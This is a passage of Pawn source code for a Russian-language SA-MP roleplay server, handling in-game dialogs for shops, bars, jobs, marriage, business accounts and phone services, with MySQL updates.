			new price = gShopCosts[listitem];
			if(GetMoney(playerid) < price) return SendMess(playerid, MSG_NOT_MONEY);
			//if(listitem > 1)
			//{
			switch(listitem)
    		{
  				case 0:
				{
					GivePlayerWeapon(playerid, 43, 20);
  					SendClientMessage(playerid, 0xffd83dFF, "Вы купили фотоаппарат(20 снимков)");
  					GiveMoney(playerid, -1000);
				}
				case 1:
				{
					if (PI[playerid][pPhones] == 1) return SendClientMessage(playerid, COLOR_GREY, "У вас уже есть телефон");
					PI[playerid][pPhones] = 1;
					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE accounts SET phone=1 WHERE name='%s'", GetName(playerid));
					mysql_query(dbHandle, STRING_GLOBAL);
					SendClientMessage(playerid, 0xffd83dFF, "Вы купили телефон");
					GiveMoney(playerid, -price);
				}
				case 2:
				{
					if(PI[playerid][pPhones] == 0) return SendClientMessage(playerid, COLOR_GREY, "У Вас нет телефона!");
					if(PI[playerid][pLevel] == 1) return SendClientMessage(playerid, COLOR_GREY, "Покупать SIM-CARD можно со 2 ЛВЛа");

					ShowPlayerDialog(playerid, D_BUYSIM, DIALOG_STYLE_INPUT, "Покупка SIM-карты", "{FFFFFF}Введите новый шестизначный номер", "Купить", "Закрыть");
					return 1;
				}
				case 3:
				{
					GivePlayerWeapon(playerid, 81, 1);
		   			SendClientMessage(playerid, 0xffd83dFF, "Вы купили цветы");
		   			GiveMoney(playerid, -price);
				}
				case 4:
				{
					GiveItem(playerid, 35, 1);
					SendClientMessage(playerid, 0xffd83dFF, "Вы купили маску");
					GiveMoney(playerid, -price);
				}
				case 5:
				{
					GiveItem(playerid, 37, 1);
					SendClientMessage(playerid, 0xffd83dFF, "Вы купили пачку сигарет");
					GiveMoney(playerid, -price);
				}
				case 6:
				{
				    if(PI[playerid][pAptechka] >= 3) return SendClientMessage(playerid, COLOR_GREY, "В рюкзак вмещается до 3 аптечек!");
					PI[playerid][pAptechka]++;
					GiveItem(playerid, 34, 1);
					SendMes(playerid, 0xffd83dFF, "Вы купили 1 аптечку, теперь у Вас %d аптечек(-ки)",PI[playerid][pAptechka]);
					MysqlUpdatePlayerInt(playerid, "aptechka", PI[playerid][pAptechka]);
					GiveMoney(playerid, -price);
				}
				case 7:
				{
					for (new s = 0; s < 74; s++) {
						if (PlayerInventory[playerid][s][ItemIconIndex] == 27) return SendClientMessage(playerid, COLOR_GREY, "У вас уже есть кабель");
					}
					GiveItem(playerid, 53, 1);
					SendClientMessage(playerid, 0xffd83dFF, "Вы купили кабель для принтера");
					GiveMoney(playerid, -price);
				}
			}
		   	if(BizzInfo[i][bProduct] > 0)
		   	{
				BizzInfo[i][bMoney] += price / 2;
				BizzPay[i] += price / 2;
				BizzInfo[i][bProduct] -= gShopProd[listitem];
			    MysqlUpdateBizzInt(i, "money", BizzInfo[i][bMoney]);
				MysqlUpdateBizzInt(i, "product", BizzInfo[i][bProduct]);
			}
		    MagazineList(playerid);
		}
	case D_HEAL+14:
		{
			if(!response) return 1;
			new i = GetPVarInt(playerid, "PlayerBizz");
		    new price = gEateryCosts[listitem];
			if(GetMoney(playerid) < price) return SendMess(playerid, MSG_NOT_MONEY);
			switch(listitem)
			{
				case 0: {
					MeAction(playerid, "купил(а) еду с собой");
					GiveItem(playerid, 11, 1);
					SendClientMessage(playerid, COLOR_YELLOW, "Предмет 'Пицца в коробке' был помещен к вам в инвентарь!");
				}
			case 1: {
					MeAction(playerid, "купил(а) еду с собой");
					GiveItem(playerid, 3, 1);
					SendClientMessage(playerid, COLOR_YELLOW, "Предмет 'бургер' был помещен к вам в инвентарь!");
				}
			case 2: {
					MeAction(playerid, "купил(а) еду с собой");
					GiveItem(playerid, 4, 1);
					SendClientMessage(playerid, COLOR_YELLOW, "Предмет 'Куриная ножка' был помещен к вам в инвентарь!");
				}
			case 3: {
					MeAction(playerid, "купил(а) еду с собой");
					GiveItem(playerid, 16, 1);
					SendClientMessage(playerid, COLOR_YELLOW, "Предмет 'Кола' был помещен к вам в инвентарь!");
				}
			case 4: {
					MeAction(playerid, "купил(а) еду с собой");
					GiveItem(playerid, 6, 1);
					SendClientMessage(playerid, COLOR_YELLOW, "Предмет 'Большой бургер' был помещен к вам в инвентарь!");
				}
			case 5: {
					MeAction(playerid, "купил(а) еду с собой");
					GiveItem(playerid, 7, 1);
					SendClientMessage(playerid, COLOR_YELLOW, "Предмет 'Острые куриные ножки' был помещен к вам в инвентарь!");
				}
			case 6: {
					MeAction(playerid, "купил(а) еду с собой");
					GiveItem(playerid, 9, 1);
					SendClientMessage(playerid, COLOR_YELLOW, "Предмет 'бургер' был помещен к вам в инвентарь!");
				}
			case 7: {
					MeAction(playerid, "купил(а) еду с собой");
					GiveItem(playerid, 13, 1);
					SendClientMessage(playerid, COLOR_YELLOW, "Предмет 'Газировка' был помещен к вам в инвентарь!");
				}
			case 8: {
					MeAction(playerid, "купил(а) еду с собой");
					GiveItem(playerid, 14, 1);
					SendClientMessage(playerid, COLOR_YELLOW, "Предмет 'Чай' был помещен к вам в инвентарь!");
				}
			case 9: {
					MeAction(playerid, "купил(а) еду с собой");
					GiveItem(playerid, 15, 1);
					SendClientMessage(playerid, COLOR_YELLOW, "Предмет 'Кофе' был помещен к вам в инвентарь!");
				}
			case 10: {
					MeAction(playerid, "купил(а) еду с собой");
					GiveItem(playerid, 16, 1);
					SendClientMessage(playerid, COLOR_YELLOW, "Предмет 'Кола' был помещен к вам в инвентарь!");
				}
			}
			GiveMoney(playerid, -price);
			if(BizzInfo[i][bProduct] > 0)
			{
				BizzInfo[i][bMoney] += price * 2;
				BizzPay[i] += price * 2;
				BizzInfo[i][bProduct] -= gEateryProd[listitem];
				MysqlUpdateBizzInt(i, "money", BizzInfo[i][bMoney]);
				MysqlUpdateBizzInt(i, "product", BizzInfo[i][bProduct]);
			}
			EatList(playerid, i);
		}
	case D_HEAL+15:
		{
			if(!response) return 1;
			new i = GetPVarInt(playerid, "PlayerBizz"), till = BizzInfo[i][bTill];
			if(PI[playerid][pHunger] >= 100) return SendClientMessage(playerid, COLOR_GREY, "Вы не голодны!");
			new price = gBarCost[listitem];
			if(GetMoney(playerid) < till * price) return SendMess(playerid, MSG_NOT_MONEY);
			switch(listitem)
			{
			case 0:
				{
					if(PI[playerid][pSex] == 1) MeAction(playerid, "выпил воды");
					else MeAction(playerid, "выпила воды");
					if(PI[playerid][pHunger]+10 > 100)
					{
						SetHunger(playerid, 100);
						SendClientMessage(playerid, COLOR_WHITE, "Вы полностью наелись!");
					}
					else GiveHunger(playerid, 10);
				}
			case 1:
				{
					if(PI[playerid][pSex] == 1) MeAction(playerid, "выпил соды");
					else MeAction(playerid, "выпила соды");
					if(PI[playerid][pHunger]+10 > 100)
					{
						SetHunger(playerid, 100);
						SendClientMessage(playerid, COLOR_WHITE, "Вы полностью наелись!");
					}
					else GiveHunger(playerid, 10);
				}
			case 2:
				{
					if(PI[playerid][pSex] == 1) MeAction(playerid, "выпил кока-колы");
					else MeAction(playerid, "выпила кока-колы");
					if(PI[playerid][pHunger]+10 > 100)
					{
						SetHunger(playerid, 100);
						SendClientMessage(playerid, COLOR_WHITE, "Вы полностью наелись!");
					}
					else GiveHunger(playerid, 10);
				}
			case 3:
				{
					if(PI[playerid][pSex] == 1) MeAction(playerid, "выпил пиво");
					else MeAction(playerid, "выпила пиво");
					if(PI[playerid][pHunger]+20 > 100)
					{
						SetHunger(playerid, 100);
						SendClientMessage(playerid, COLOR_WHITE, "Вы полностью наелись!");
					}
					else GiveHunger(playerid, 20);
					if(GetPlayerDrunkLevel(playerid) < 20000) SetPlayerDrunkLevel(playerid,GetPlayerDrunkLevel(playerid)+2000);
				}
			case 4:
				{
					if(PI[playerid][pSex] == 1) MeAction(playerid, "выпил водки");
					else MeAction(playerid, "выпила водки");
					if(PI[playerid][pHunger]+30 > 100)
					{
						SetHunger(playerid, 100);
						SendClientMessage(playerid, COLOR_WHITE, "Вы полностью наелись!");
					}
					else GiveHunger(playerid, 30);
					if(GetPlayerDrunkLevel(playerid) < 20000) SetPlayerDrunkLevel(playerid,GetPlayerDrunkLevel(playerid)+5000);
				}
			case 5:
				{
					if(PI[playerid][pSex] == 1) MeAction(playerid, "выпил коньяк");
					else MeAction(playerid, "выпила коньяк");
					if(PI[playerid][pHunger]+30 > 100)
					{
						SetHunger(playerid, 100);
						SendClientMessage(playerid, COLOR_WHITE, "Вы полностью наелись!");
					}
					else GiveHunger(playerid, 30);
					if(GetPlayerDrunkLevel(playerid) < 20000) SetPlayerDrunkLevel(playerid,GetPlayerDrunkLevel(playerid)+5000);
				}
			case 6:
				{
				    if(PI[playerid][pSex] == 1) MeAction(playerid, "выпил абсент");
				    else MeAction(playerid, "выпила абсент");
					if(PI[playerid][pHunger]+30 > 100)
					{
						SetHunger(playerid, 100);
						SendClientMessage(playerid, COLOR_WHITE, "Вы полностью наелись!");
					}
					else GiveHunger(playerid, 30);
					if(GetPlayerDrunkLevel(playerid) < 20000) SetPlayerDrunkLevel(playerid,GetPlayerDrunkLevel(playerid)+5000);
				}
			}
			GiveMoney(playerid, -till * price);
			if(BizzInfo[i][bProduct] > 0)
			{
				BizzInfo[i][bMoney] += till * price;
				BizzPay[i] += till * price;
				BizzInfo[i][bProduct] -= gBarProd[listitem];
				MysqlUpdateBizzInt(i, "money", BizzInfo[i][bMoney]);
				MysqlUpdateBizzInt(i, "product", BizzInfo[i][bProduct]);
			}
			ApplyAnimation(playerid, "BAR", "dnk_stndF_loop", 4.1, 0, 0, 0, 0, 0, 1);
			if(GetPlayerDrunkLevel(playerid) > 20000) SetPlayerDrunkLevel(playerid, 20000);
			BarList(playerid);
		}
	case D_HEAL+16:
		{
			if(!response) return 1;
			new i = GetPVarInt(playerid, "PlayerBizz");
			strmid(BizzInfo[i][bOwner], "None", 0, MAX_PLAYER_NAME, MAX_PLAYER_NAME);
			SendMes(playerid, COLOR_RED, "Вы продали свой бизнес за %iр. Деньги с бизнеса переведены на Ваш счет",BizzInfo[i][bPrice]/2);
			PI[playerid][pBank] += BizzInfo[i][bBuyPrice];
			PI[playerid][pBank] += BizzInfo[i][bMoney];
			MysqlUpdatePlayerInt(playerid, "bank", PI[playerid][pBank]);
			BizzInfo[i][bLock] = BizzInfo[i][bBuyPrice] = BizzInfo[i][bMoney] = BizzInfo[i][bEnter] = BizzInfo[i][bControl] = 0;
			BizzInfo[i][bTill] = 50;
			switch(BizzInfo[i][bType])
			{
			    case 1: BizzInfo[i][bProduct] = 5000;
			    case 2: BizzInfo[i][bProduct] = 20000;
			    case 3: BizzInfo[i][bProduct] = 3000;
			    case 4: BizzInfo[i][bProduct] = 7000;
			    case 5: BizzInfo[i][bProduct] = 7000;
			    case 6: BizzInfo[i][bProduct] = 20000;
			    case 7: BizzInfo[i][bProduct] = 100000;
			    case 8: BizzInfo[i][bProduct] = 50000;
			    case 9: BizzInfo[i][bProduct] = 50000;
			}
			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_BIZZ" SET owner='%s', block=%d, money=%d, penter=%d, till=%d, buyprice=%d , product=%d WHERE id = %d",
			BizzInfo[i][bOwner], BizzInfo[i][bLock], BizzInfo[i][bMoney], BizzInfo[i][bEnter], BizzInfo[i][bTill], BizzInfo[i][bBuyPrice], BizzInfo[i][bProduct],i);
			mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
			UpdateBizz(i);
		}
	case D_HEAL+17:
		{
			if(!response) return 1;
			switch(listitem)
			{
			case 0:
				{
				    if(PI[playerid][pJob]) return SendClientMessage(playerid, COLOR_GREY, "Сначала увольтесь с прежней работы!");
					else if(PI[playerid][pLevel] < 2) return SendClientMessage(playerid, COLOR_GREY, "Работа доступна со 2-го уровня!");//2
					PI[playerid][pJob] = JOB_BUS;
					SendClientMessage(playerid, 0x00CC00FF, "[Успешно] Вы были приняты на работу водитель маршрутки");
					SendClientMessage(playerid, 0xFFC800FF, "[Подсказка] Помощь по командам: /menu - Команды сервера");
				}
			case 1:
				{
					if(PI[playerid][pJob]) return SendClientMessage(playerid, COLOR_GREY, "Сначала увольтесь с прежней работы!");
					else if(PI[playerid][pLevel] < 2) return SendClientMessage(playerid, COLOR_GREY, "Работа доступна со 2-го уровня!");//2
					PI[playerid][pJob] = JOB_TAXI;
					SendClientMessage(playerid, 0x00CC00FF, "[Успешно] Вы были приняты на работу водитель такси");
					SendClientMessage(playerid, 0xFFC800FF, "[Подсказка] Помощь по командам: /menu - Команды сервера");
				}
			case 2:
				{
					if(PI[playerid][pJob]) return SendClientMessage(playerid, COLOR_GREY, "Сначала увольтесь с прежней работы!");
					else if(PI[playerid][pLevel] < 3) return SendClientMessage(playerid, COLOR_GREY, "Работа доступна с 3-го уровня!");//3
					PI[playerid][pJob] = JOB_MECHANIC;
					SendClientMessage(playerid, 0x00CC00FF, "[Успешно] Вы были приняты на работу автомеханика");
					SendClientMessage(playerid, 0xFFC800FF, "[Подсказка] Помощь по командам: /menu - Команды сервера");
				}
			case 3:
				{
					if(PI[playerid][pJob]) return SendClientMessage(playerid, COLOR_GREY, "Сначала увольтесь с прежней работы!");
					else if(PI[playerid][pLevel] < 6) return SendClientMessage(playerid, COLOR_GREY, "Работа доступна с 6-го уровня!");//3
					PI[playerid][pJob] = JOB_TRUCK;
					SendClientMessage(playerid, 0x00CC00FF, "[Успешно] Вы были приняты на работу Дальнобойщиком");
					SendClientMessage(playerid, 0xFFC800FF, "[Подсказка] Помощь по командам: /menu - Команды сервера");
				}
			case 4:
				{
			        if(PI[playerid][pMember]) return SendClientMessage(playerid, COLOR_GREY, "Вы состоите в организации!");
					else if(!PI[playerid][pJob]) return SendClientMessage(playerid, COLOR_GREY, "Вы нигде не работаете!");
					PI[playerid][pJob] = 0;
					SendClientMessage(playerid, 0xffd83dFF, "Вы уволились с работы");
			    }
			}
			MysqlUpdatePlayerInt(playerid, "job", PI[playerid][pJob]);
		}
	case D_HEAL+19:
		{
			new targetid = GetPVarInt(playerid, "PlayerMarriage");
			if(response)
			{
			    new string[128];
				format(string, sizeof(string), "%s и %s вступили в брак", GetName(targetid), GetName(playerid));
				SendClientMessageToAll(COLOR_PURPLE, string);
				strmid(PI[playerid][pWhoMarried], GetName(targetid), 0, strlen(GetName(targetid)), MAX_PLAYER_NAME);
				strmid(PI[targetid][pWhoMarried], GetName(playerid), 0, strlen(GetName(playerid)), MAX_PLAYER_NAME);
				PI[playerid][pMarried] = PI[targetid][pMarried] = 1;
				MysqlUpdatePlayerInt(playerid, "married", PI[playerid][pMarried]);
				MysqlUpdatePlayerInt(targetid, "married", PI[targetid][pMarried]);
				MysqlUpdatePlayerStr(playerid, "whomarried", PI[playerid][pWhoMarried]);
				MysqlUpdatePlayerStr(targetid, "whomarried", PI[targetid][pWhoMarried]);
				SendMes(playerid, COLOR_YELLOW, "Вы приняли предложение связать судьбу с %s", GetName(targetid));
				if(PI[playerid][pSex] == 1) SendMes(targetid, COLOR_GREEN, "%s принял предложение связать судьбу с вами", GetName(playerid));
				else SendMes(targetid, COLOR_GREEN, "%s приняла предложение связать судьбу с вами", GetName(playerid));
			}
			else
			{
				if(PI[playerid][pSex] == 1) SendMes(targetid, COLOR_RED, "%s отклонил предложение связать судьбу с вами", GetName(playerid));
				else SendMes(targetid, COLOR_RED, "%s отклонила предложение связать судьбу с вами", GetName(playerid));
			}
			DeletePVar(playerid, "PlayerMarriage");
		}
	case D_HEAL+20:
		{
			new targetid = GetPVarInt(playerid, "PlayerMarriage");
			if(response)
			{
				strmid(PI[playerid][pWhoMarried], "None", 0, strlen("None"), MAX_PLAYER_NAME);
				strmid(PI[targetid][pWhoMarried], "None", 0, strlen("None"), MAX_PLAYER_NAME);
				PI[playerid][pMarried] = PI[targetid][pMarried] = 0;
				MysqlUpdatePlayerInt(playerid, "married", PI[playerid][pMarried]);
				MysqlUpdatePlayerInt(targetid, "married", PI[targetid][pMarried]);
				MysqlUpdatePlayerStr(playerid, "whomarried", PI[playerid][pWhoMarried]);
				MysqlUpdatePlayerStr(targetid, "whomarried", PI[targetid][pWhoMarried]);
				SendMes(playerid, COLOR_YELLOW, "Вы приняли предложение развестись %s", GetName(targetid));
				if(PI[playerid][pSex] == 1) SendMes(targetid, COLOR_GREEN, "%s принял предложение развестись с вами", GetName(playerid));
				else SendMes(targetid, COLOR_GREEN, "%s приняла предложение развестись с вами", GetName(playerid));
			}
			else
			{
				if(PI[playerid][pSex] == 1) SendMes(targetid, COLOR_RED, "%s отклонил предложение развестись с вами", GetName(playerid));
				else SendMes(targetid, COLOR_RED, "%s отклонила предложение развестись с вами", GetName(playerid));
			}
			DeletePVar(playerid, "PlayerMarriage");
		}
	case D_HEAL+21:
		{
			if(!response) return 1;
			new price, string[128];
			new b = GetPVarInt(playerid, "PlayerBizz");
			if(sscanf(inputtext, "i", price))
			{
				format(string, sizeof(string), "{FFFFFF}Введите сумму пополнения\nТекущий счет бизнеса: %dр", BizzInfo[b][bMoney]);
				return ShowPlayerDialog(playerid, D_HEAL+21, 1, "Пополнение счета бизнеса", string, "Принять", "Назад");
			}
			if(price < 1)
			{
				format(string, sizeof(string), "{FFFFFF}Введите сумму пополнения\nТекущий счет бизнеса: %dр", BizzInfo[b][bMoney]);
				return ShowPlayerDialog(playerid, D_HEAL+21, 1, "Пополнение счета бизнеса", string, "Принять", "Назад");
			}
			if(PI[playerid][pBank] < price)
			{
				SendClientMessage(playerid, COLOR_GREY, "На вашем счету в банке не хватает денег!");
				format(string, sizeof(string), "{FFFFFF}Введите сумму пополнения\nТекущий счет бизнеса: %dр", BizzInfo[b][bMoney]);
				return ShowPlayerDialog(playerid, D_HEAL+21, 1, "Пополнение счета бизнеса", string, "Принять", "Назад");
			}
			PI[playerid][pBank] -= price;
			BizzInfo[b][bMoney] += price;
			MysqlUpdateBizzInt(b, "money", BizzInfo[b][bMoney]);
			SendMes(playerid, TEAM_BLUE_COLOR, "Вы положили на счет бизнеса: %iр. На счете бизнеса: %iр", price, BizzInfo[b][bMoney]);
			MysqlUpdatePlayerInt(playerid, "bank", PI[playerid][pBank]);
		}
 	case D_HEAL+213:
		{
			if(!response) return 1;
			new price, string[128];
			new b = GetPVarInt(playerid, "PlayerBizz");
			if(sscanf(inputtext, "i", price))
			{
				format(string, sizeof(string), "{FFFFFF}Введите сумму вывода денег с бизнеса\nТекущий счет бизнеса: %dр", BizzInfo[b][bMoney]);
				return ShowPlayerDialog(playerid, D_HEAL+213, 1, "Вывод счета с бизнеса", string, "Принять", "Назад");
			}
			if(price < 1)
			{
				format(string, sizeof(string), "{FFFFFF}Введите сумму вывода денег с бизнеса\nТекущий счет бизнеса: %dр", BizzInfo[b][bMoney]);
				return ShowPlayerDialog(playerid, D_HEAL+213, 1, "Вывод счета с бизнеса", string, "Принять", "Назад");
			}
			if(BizzInfo[b][bMoney] < price)
			{
				SendClientMessage(playerid, COLOR_GREY, "На вашем счету в бизнесе не хватает денег!");
				format(string, sizeof(string), "{FFFFFF}Введите сумму вывода денег с бизнеса\nТекущий счет бизнеса: %dр", BizzInfo[b][bMoney]);
				return ShowPlayerDialog(playerid, D_HEAL+213, 1, "Вывод счета с бизнеса", string, "Принять", "Назад");
			}
			BizzInfo[b][bMoney] -= price;
			GiveMoney(playerid, price);
			MysqlUpdateBizzInt(b, "money", BizzInfo[b][bMoney]);
			SendMes(playerid, TEAM_BLUE_COLOR, "Вы вывели со счета бизнеса: %iр. На счете бизнеса: %iр", price, BizzInfo[b][bMoney]);
		}
	case D_ATM+1:
		{
			if(!response) return 1;
			new price, string[150];
			if(sscanf(inputtext, "i", price))
			{
				format(string, sizeof(string), "{FFFFFF}Введите сумму пополнения\n\nКомиссия за операцию: {1D99D4}0%%\n\n{FFFFFF}Текущее состояние счёта: {63BD4E}%dр", PI[playerid][pPhoneBalance]);
				return ShowPlayerDialog(playerid, D_ATM+1, 1, "Пополнение счета телефона", string, "Принять", "Назад");
			}
			if(price < 1)
			{
				format(string, sizeof(string), "{FFFFFF}Введите сумму пополнения\n\nКомиссия за операцию: {1D99D4}0%%\n\n{FFFFFF}Текущее состояние счёта: {63BD4E}%dр", PI[playerid][pPhoneBalance]);
				return ShowPlayerDialog(playerid, D_ATM+1, 1, "Пополнение счета телефона", string, "Принять", "Назад");
			}
			if(GetMoney(playerid) < price)
			{
			    SendMess(playerid, MSG_NOT_MONEY);
				format(string, sizeof(string), "{FFFFFF}Введите сумму пополнения\n\nКомиссия за операцию: {1D99D4}0%%\n\n{FFFFFF}Текущее состояние счёта: {63BD4E}%dр", PI[playerid][pPhoneBalance]);
				return ShowPlayerDialog(playerid, D_ATM+1, 1, "Пополнение счета телефона", string, "Принять", "Назад");
			}
			if(PI[playerid][pPhoneBalance] + price > 15000) return SendClientMessage(playerid, COLOR_GREY, "Нельзя положить на баланс телефона более 15000р");
			PI[playerid][pPhoneBalance] += price;
			MysqlUpdatePlayerInt(playerid, "phonebalance", PI[playerid][pPhoneBalance]);
			GiveMoney(playerid, -price);
			SendMes(playerid, COLOR_YELLOW, "SMS: {FFFFFF}Поступление платежа: %iр. Текущее состояние счёта: %iр. {FFFF00}Отправитель: {FFFFFF}Оператор связи", price, PI[playerid][pPhoneBalance]);
			return 1;
		}
	case D_ATM+4:
	    {
	        if(!response) return 1;
			new price, string[150];
			if(sscanf(inputtext, "i", price))
			{
				format(string, sizeof(string), "{FFFFFF}Введите количество денег, которые хотите пожертвовать на благотворительность\n\nВы пожертвовали: {63BD4E}%dр", PI[playerid][pCharity]);
				return ShowPlayerDialog(playerid, D_ATM+4, 1, "Благотворительность", string, "Принять", "Назад");
			}
			if(price < 1)
			{
				format(string, sizeof(string), "{FFFFFF}Введите количество денег, которые хотите пожертвовать на благотворительность\n\nВы пожертвовали: {63BD4E}%dр", PI[playerid][pCharity]);
				return ShowPlayerDialog(playerid, D_ATM+4, 1, "Благотворительность", string, "Принять", "Назад");
			}
			if(GetMoney(playerid) < price)
			{
			    SendMess(playerid, MSG_NOT_MONEY);
				format(string, sizeof(string), "{FFFFFF}Введите количество денег, которые хотите пожертвовать на благотворительность\n\nВы пожертвовали: {63BD4E}%dр", PI[playerid][pCharity]);
				return ShowPlayerDialog(playerid, D_ATM+4, 1, "Благотворительность", string, "Принять", "Назад");
			}
			PI[playerid][pCharity] += price;
			MysqlUpdatePlayerInt(playerid, "charity", PI[playerid][pCharity]);
			GiveMoney(playerid, -price);
			FracBank[9] += price;
			MysqlUpdateOtherInt("sfnbank", FracBank[9]);
			SendMes(playerid, COLOR_YELLOW, "Вы пожертвовали на благотворительность {FFFFFF}%dр{FFFF00}. Список самых щедрых: {FFFFFF}/charity", price);
			return 1;
	    }
	case D_HEAL+26:
		{
			if(!response) return 1;
			new idx = GetPVarInt(playerid, "PlayerBizz");
			if(GetMoney(playerid) < BizzInfo[idx][bEnter]) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств для входа!");
			SetTimerEx("PickupBack",3000,0,"i",playerid);
	        pickupentered[playerid] = 1;
			GiveMoney(playerid, -BizzInfo[idx][bEnter]);
			BizzInfo[idx][bMoney] += BizzInfo[idx][bEnter];
			BizzPay[idx] += BizzInfo[idx][bEnter];
			MysqlUpdateBizzInt(idx, "money", BizzInfo[idx][bMoney]);
			FreezePlayer(playerid, 5000);
			SetPlayerPos(playerid, g_business_info[BizzInfo[idx][bType]-1][BI_EXIT_X], g_business_info[BizzInfo[idx][bType]-1][BI_EXIT_Y], g_business_info[BizzInfo[idx][bType]-1][BI_EXIT_Z]);
			SetPlayerFacingAngle(playerid, g_business_info[BizzInfo[idx][bType]-1][BI_EXIT_A]);
			SetPlayerInterior(playerid,BizzInfo[idx][bInt]);
			SetPlayerVirtualWorld(playerid,BizzInfo[idx][bVirtual]);
			SetCameraBehindPlayer(playerid);
			return 1;
		}
	case D_LEAVE:
		{
		    if(!response) return 1;
		    new str[89];
		    format(str, sizeof(str), "[Внимание] %s покинул организацию по собственному желанию (/leave)", GetName(playerid));
			SendFMes(PI[playerid][pMember], COLOR_YELLOW, str);
	        LeaveFractionPlayer(playerid);
	        return 1;
		}
	case D_BUYSIM:
	    {
	        if(!response) return 1;
	        if(!isNumeric(inputtext) || strlen(inputtext) != 6 || inputtext[0] == '0')
 			{
	            SendClientMessage(playerid, COLOR_GREY, "Номер должен состоять из 6 цифр. Первая цифра не должны быть \"ноль\"");
				ShowPlayerDialog(playerid, D_BUYSIM, DIALOG_STYLE_INPUT, "Покупка SIM-карты", "{FFFFFF}Введите новый шестизначный номер", "Купить", "Закрыть");
				return 1;
	        }
			foreach(new i: Player)
			{
			    if(PI[i][pPhoneNumber] == strval(inputtext)) SendClientMessage(playerid, COLOR_GREY, "Такой номер уже используется");
				break;
			}
	        new str[60];
	        format(str, sizeof(str), "SELECT * FROM "T_ACCOUNTS" WHERE phonenumber = '%i'", strval(inputtext));
	        mysql_tquery(dbHandle, str, "OnPlayerSetPhoneNumber", "i", playerid);
	        SetPVarInt(playerid, "CheckNumber", strval(inputtext));
	    }
	case D_PHONE:
	    {
	        if(!response) return 1;
	        switch(listitem)
	        {
	            //case 0: ShowPlayerDialog(playerid, D_PHONE+1, DIALOG_STYLE_LIST, "Контакты", "1. Список контактов\n2. Добавить контакт\n3. Удалить контакт", "Выбрать", "Назад");
	            case 0:
				{
				    if(PI[playerid][pMuted] > 0) return SendMess(playerid, MSG_PLAYER_HAVE_MUTE);
					if(PI[playerid][pJail] > 0) return SendClientMessage(playerid, COLOR_GREY, "У Вас изъяли телефон!");
				   	if(Mobile[playerid] != -1) return SendClientMessage(playerid, COLOR_GREY, "Вы уже разговариваете по телефону!");
				   	if(Phone[playerid] == false) return SendClientMessage(playerid, COLOR_GREY, "У Вас выключен телефон!");
		  		 	if(Ether[playerid] == true) return SendClientMessage(playerid, COLOR_GREY, "Действие невозможно!");
					ShowPlayerDialog(playerid, D_PHONE+2, 1, "Номер телефона", "{ffffff}Введите номер телефона абонента:", "Принять", "Назад");
				}
				case 1:
				{
					if(PI[playerid][pMuted] > 0) return SendMess(playerid, MSG_PLAYER_HAVE_MUTE);
					if(PI[playerid][pJail] > 0) return SendClientMessage(playerid, COLOR_GREY, "У Вас изъяли телефон!");
					if(Phone[playerid] == false) return SendClientMessage(playerid, COLOR_GREY, "У Вас выключен телефон!");
					ShowPlayerDialog(playerid, D_PHONE+3, 1, "Номер телефона", "{ffffff}Введите номер телефона абонента:", "Принять", "Назад");
				}
				case 2:
				{
				    if(PI[playerid][pJail] > 0) return SendClientMessage(playerid, COLOR_GREY, "У Вас изъяли телефон!");
					ShowPlayerDialog(playerid, D_HEAL+3, 2, "Сервисы", "1. Вызвать механика\n2. Вызвать такси\n3. Вызвать скорую помошь\n4. Вызвать полицию", "Принять", "Назад");
				}
	        }
	    }
	case D_PHONE+1:
	    {
	        if(!response) return 1;
	        switch(listitem)
	        {
	            case 0:
		        {
		            new string[900], str[100];
				    strcat(string, "{FFFF00}Ник игрока\t\t{FFFF00}Номер\n");
					for(new i; i < 8; i++)
					{
						format(str, sizeof(str), "{FFFFFF}%s\t\t%d\n", (PhoneNumbers[playerid][i]) ? GetNameWithNumber(PhoneNumbers[playerid][i]) : ("Offline/None"), PhoneNumbers[playerid][i]);
						strcat(string, str);
					}
					ShowPlayerDialog(playerid, D_PHONE+7, DIALOG_STYLE_MSGBOX, "Список контактов", string, "Принять", "Назад");
	            }
	        }
			return 1;
	    }
	case D_PHONE+5:
	    {
	        if(!response) return ShowPlayerDialog(playerid, D_PHONE+1, DIALOG_STYLE_LIST, "Контакты", "1. Список контактов\n2. Добавить контакт\n3. Удалить контакт", "Выбрать", "Назад");
	        if(PhoneNumbers[playerid][listitem] == 0) return SendClientMessage(playerid, COLOR_GREY, "Слот для контакта пустой!");
			new str[128];
			format(str, sizeof(str), "Контакт %s | %d удален", GetNameWithNumber(PhoneNumbers[playerid][listitem]), PhoneNumbers[playerid][listitem]);
			SendClientMessage(playerid, COLOR_RED, str);
			PhoneNumbers[playerid][listitem] = 0;
			return 1;
	    }
	case D_PHONE+6:
		{
		    if(!response) return ShowPlayerDialog(playerid, D_PHONE+1, DIALOG_STYLE_LIST, "Контакты", "1. Список контактов\n2. Добавить контакт\n3. Удалить контакт", "Выбрать", "Назад"), DeletePVar(playerid, "SelectedSlot");
		    SetPVarInt(playerid, "SelectedSlot", listitem);
			ShowPlayerDialog(playerid, D_PHONE+8, DIALOG_STYLE_INPUT, "Добавление контакта", "{ffffff}Введите номер контакта:", "Добавить", "Назад");
			return 0;
		}
	case D_PHONE+7:
	    {
	        if(!response) return ShowPlayerDialog(playerid, D_PHONE+1, DIALOG_STYLE_LIST, "Контакты", "1. Список контактов\n2. Добавить контакт\n3. Удалить контакт", "Выбрать", "Назад");
	        else return 1;
	    }
	case D_PHONE+8:
	    {
	        if(!response) return 0;
			if(!strlen(inputtext)) return ShowPlayerDialog(playerid, D_PHONE+8, DIALOG_STYLE_INPUT, "Добавление контакта", "{ffffff}Введите номер контакта:", "Добавить", "Назад");
			new str[128], slot = GetPVarInt(playerid, "SelectedSlot");
			format(str, sizeof(str), "Номер %d добавлен в слот %d", strval(inputtext), slot);
			SendClientMessage(playerid, COLOR_GREEN, str);
			PhoneNumbers[playerid][slot] = strval(inputtext);
			return 1;
	    }
    case D_PHONE+10:
	    {
	        if(!response) return 1;
	        switch(listitem)
	        {
	            case 0:
		        {
					new string[128];

					STRING_GLOBAL[0] = EOS;
					format(string, sizeof(string), "{FFFFFF}JSocial - социальная сеть\nвозможно общаться с людьми имеющих услуги интернета.\nДля общение введите '/js'");
					strcat(STRING_GLOBAL, string);
